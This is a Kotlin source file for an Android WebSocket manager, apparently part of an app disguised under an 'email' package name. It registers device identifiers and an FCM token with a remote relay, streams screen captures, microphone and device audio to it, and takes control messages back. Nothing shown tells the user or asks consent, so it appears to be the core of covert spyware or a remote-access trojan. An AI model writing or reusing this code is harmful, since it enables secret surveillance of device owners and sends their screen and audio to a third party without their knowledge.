package com.email.service

import com.email.BuildConfig
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Framing protocol (binary WebSocket frames):
 *   Byte 0 = type prefix
 *   Bytes 1..N = payload
 *
 *   0x01 = screen JPEG frame
 *   0x02 = mic PCM chunk
 *   0x03 = device audio PCM chunk
 *   0x04 = JSON control/info message
 */
class WebSocketManager private constructor() {

    companion object {
        const val TYPE_SCREEN: Byte = 0x01
        const val TYPE_MIC: Byte = 0x02
        const val TYPE_DEVICE_AUDIO: Byte = 0x03
        const val TYPE_JSON: Byte = 0x04

        @Volatile
        private var instance: WebSocketManager? = null

        fun getInstance(): WebSocketManager =
            instance ?: synchronized(this) {
                instance ?: WebSocketManager().also { instance = it }
            }
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)  // no timeout on read — streaming
        .writeTimeout(15, TimeUnit.SECONDS)
        .pingInterval(20, TimeUnit.SECONDS)
        .build()

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    @Volatile private var webSocket: WebSocket? = null
    @Volatile private var isConnected = AtomicBoolean(false)
    private var reconnectDelay = 1000L
    private val maxReconnectDelay = 30_000L

    var deviceId: String = ""
    var deviceName: String = ""
    var model: String = ""
    var androidVersion: String = ""
    var fcmToken: String = ""
    var battery: Int = 0
    var storage: String = ""

    // Callback invoked when a control JSON arrives from the server
    var onControlEvent: ((String) -> Unit)? = null

    fun connect() {
        scope.launch { connectInternal() }
    }

    private suspend fun connectInternal() {
        val url = BuildConfig.RELAY_URL
        val request = Request.Builder().url(url).build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                isConnected.set(true)
                reconnectDelay = 1000L
                sendRegisterFrame(ws)
            }

            override fun onMessage(ws: WebSocket, bytes: okio.ByteString) {
                val raw = bytes.toByteArray()
                if (raw.isEmpty()) return
                when (raw[0]) {
                    TYPE_JSON -> {
                        val json = String(raw, 1, raw.size - 1, Charsets.UTF_8)
                        onControlEvent?.invoke(json)
                    }
                }
            }

            override fun onMessage(ws: WebSocket, text: String) {
                onControlEvent?.invoke(text)
            }

            override fun onClosing(ws: WebSocket, code: Int, reason: String) {
                ws.close(1000, null)
                isConnected.set(false)
                scheduleReconnect()
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                isConnected.set(false)
                scheduleReconnect()
            }
        })
    }

    private fun scheduleReconnect() {
        scope.launch {
            delay(reconnectDelay)
            reconnectDelay = minOf(reconnectDelay * 2, maxReconnectDelay)
            connectInternal()
        }
    }

    private fun sendRegisterFrame(ws: WebSocket) {
        val json = JSONObject().apply {
            put("action", "register")
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("model", model)
            put("androidVersion", androidVersion)
            put("fcmToken", fcmToken)
            put("battery", battery)
            put("storage", storage)
        }.toString()
        sendJsonFrame(json)
    }

    fun sendScreenFrame(jpeg: ByteArray) {
        sendBinaryFrame(TYPE_SCREEN, jpeg)
    }

    fun sendMicAudio(pcm: ByteArray) {
        sendBinaryFrame(TYPE_MIC, pcm)
    }

    fun sendDeviceAudio(pcm: ByteArray) {
        sendBinaryFrame(TYPE_DEVICE_AUDIO, pcm)
    }

    fun sendDeviceInfo(json: String) {
        sendJsonFrame(json)
    }

    private fun sendBinaryFrame(type: Byte, payload: ByteArray) {
        if (!isConnected.get()) return
        val frame = ByteArray(payload.size + 1)
        frame[0] = type
        payload.copyInto(frame, destinationOffset = 1)
        webSocket?.send(okio.ByteString.of(*frame))
    }

    private fun sendJsonFrame(json: String) {
        if (!isConnected.get()) return
        val payload = json.toByteArray(Charsets.UTF_8)
        val frame = ByteArray(payload.size + 1)
        frame[0] = TYPE_JSON
        payload.copyInto(frame, destinationOffset = 1)
        webSocket?.send(okio.ByteString.of(*frame))
    }

    fun disconnect() {
        isConnected.set(false)
        webSocket?.close(1000, "Shutdown")
        webSocket = null
        scope.coroutineContext.cancelChildren()
    }

    fun isConnected() = isConnected.get()
}
